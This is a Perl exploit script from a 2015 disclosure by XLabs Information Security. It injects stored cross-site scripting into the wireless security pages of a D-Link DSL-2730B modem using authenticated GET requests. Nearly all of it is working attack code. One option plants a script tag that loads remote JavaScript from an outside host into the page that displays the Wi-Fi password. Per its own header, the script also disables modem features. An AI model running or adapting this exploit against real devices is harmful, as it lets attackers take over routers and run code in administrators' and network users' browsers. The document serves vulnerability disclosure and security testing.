# Exploit Title: D-Link DSL-2730B Modem wlsecrefresh.wl & wlsecurity.wl Exploit XSS Injection Stored
# Date: 11-01-2015
# Exploit Author: Mauricio Correa
# Vendor Homepage: www.dlink.com
# Hardware version: C1
# Version: GE 1.01
# Tested on: Windows 8 and Linux

#!/usr/bin/perl
#
# Date dd-mm-aaaa: 11-11-2014
# Exploit for D-Link DSL-2730B
# Cross Site Scripting (XSS Injection) Stored in wlsecrefresh.wl
# Developed by Mauricio Corrêa
# XLabs Information Security
# WebSite: www.xlabs.com.br
# More informations: www.xlabs.com.br/blog/?p=339
#
# CAUTION!
# This exploit disables some features of the modem,
# forcing the administrator of the device, accessing the page to reconfigure the modem again,
# occurring script execution in the browser of internal network users.
#
# Use with caution!
# Use at your own risk!
#



use strict;
use warnings;
use diagnostics;
use LWP::UserAgent;
use HTTP::Request;
use URI::Escape;


                my $ip = $ARGV[0];
                my $user = $ARGV[1];
                my $pass = $ARGV[2];
                my $opt = $ARGV[3];
                $ip = $1 if($ip=~/(.*)\/$/);

                               if (@ARGV != 4){

                                               print "\n";
                                               print "XLabs Information Security www.xlabs.com.br\n";
                                               print "Exploit for POC D-Link DSL-2730B Stored XSS Injection in wlsecrefresh.wl\n";
                                               print "Developed by Mauricio Correa\n";
                                               print "Contact: mauricio\@xlabs.com.br\n";
                                               print "Usage: perl $0 http:\/\/host_ip\/ user pass option\n";
                                               print "\n";
                                               print "Options: 1 - Parameter: wlAuthMode \n";
                                               print "   2 - Parameter: wl_wsc_reg \n ";
                                               print "   3 - Parameter: wl_wsc_mode \n";
                                               print "   4 - Parameter: wlWpaPsk (Execute on click to exibe Wireless password) \n";
                               }else{

                                               print "XLabs Information Security www.xlabs.com.br\n";
                                               print "Exploit for POC D-Link DSL-2730B Stored XSS Injection in wlsecrefresh.wl\n";
                                               print "Developed by Mauricio Correa\n";
                                               print "Contact: mauricio\@xlabs.com.br\n";
                                               print "[+] Exploring $ip\/ ...\n";

                                               my $payload = "%27;alert(%27\/\/XLabsSec%27);\/\/";
                                               my $ua = new LWP::UserAgent;
                                               my $hdrs = new HTTP::Headers( Accept => 'text/plain', UserAgent => "XLabs Security Exploit Browser/1.0" );
                                               $hdrs->authorization_basic($user, $pass);

                                               chomp($ip);

                                               print "[+] Preparing...\n";
                                               my $url_and_payload = "";

                                               if($opt == 1){
                                                               $url_and_payload = "$ip/wlsecrefresh.wl?wl_wsc_mode=disabled&wl_wsc_reg=disabled&wlAuth=0&wlAuthMode=1$payload".
                                                                                                                                   "&wlKeyBit=0&wlPreauth=0&wlSsidIdx=0&wlSyncNvram=1&wlWep=disabled&wlWpa=&wsc_config_state=0";
                                               }elsif($opt == 2){
                                                               $url_and_payload = "$ip/wlsecrefresh.wl?wl_wsc_mode=disabled&wl_wsc_reg=disabled$payload&wlAuth=0&wlAuthMode=997354".
                                                                                                                                               "&wlKeyBit=0&wlPreauth=0&wlSsidIdx=0&wlSyncNvram=1&wlWep=disabled&wlWpa=&wsc_config_state=0";

                                   }elsif($opt == 3){

                                                   $payload = "%27;alert(%27\/\/XLabsSec%27);\/\/";
                                                               $url_and_payload = "$ip/wlsecrefresh.wl?wl_wsc_mode=disabled$payload&wl_wsc_reg=disabled&wlAuth=0&wlAuthMode=997354".
                                                                                                                                               "&wlKeyBit=0&wlPreauth=0&wlSsidIdx=0&wlSyncNvram=1&wlWep=disabled&wlWpa=&wsc_config_state=0";

                                               }elsif($opt == 4){

                                                               $payload = "GameOver%3Cscript%20src%3D%22http%3A%2f%2fxlabs.com.br%2fxssi.js%22%3E%3C%2fscript%3E";
                                                               $url_and_payload = "$ip/wlsecurity.wl?wl_wsc_mode=enabled&wl_wsc_reg=disabled&wsc_config_state=0&wlAuthMode=psk%20psk2&wlAuth=0&".
                                                                                                                                "wlWpaPsk=$payload&wlWpaGtkRekey=0&wlNetReauth=36000&wlWep=disabled&wlWpa=aes&wlKeyBit=0&wlPreauth=0&".
                                                                                                                                "wlSsidIdx=0&wlSyncNvram=1";

                                               }else{

                                                               print "[-] Chose one option!\n";
                                                               exit;
                                               }

                                               my $req = new HTTP::Request("GET",$url_and_payload,$hdrs);

                                               print "[+] Prepared!\n";
                                               print "[+] Requesting...\n";
                                               my $resp = $ua->request($req);
                                               if ($resp->is_success){

                                               print "[+] Successfully Requested!\n";

                                               my $resposta = $resp->as_string;

                                               print "[+] Checking for properly explored...\n";
                                               my $url = "$ip/wlsecurity.html";
                                               $req = new HTTP::Request("GET",$url,$hdrs);

                                               print "[+] Checking that was explored...\n";

                                               my $resp2 = $ua->request($req);

                                                               if ($resp2->is_success){
                                                                              my $result = $resp2->as_string;
                                                                              if($opt == 4){
                                                                                              $payload = "%27GameOver%3Cscript%20src%3D%5C%22http%3A%2f%2fxlabs.com.br%2fxssi.js%5C%22%3E%3C%2fscript%3E%27";
                                                                              }

                                                                              if(index($result, uri_unescape($payload)) != -1){
                                                                              print "[+] Successfully Exploited!";
                                                                              }else{
                                                                              print "[-] Not Exploited!";
                                                                              }
                                                               }
                                               }else {

                                               print "[-] Ops!\n";
                                               print $resp->message;
                                               }
}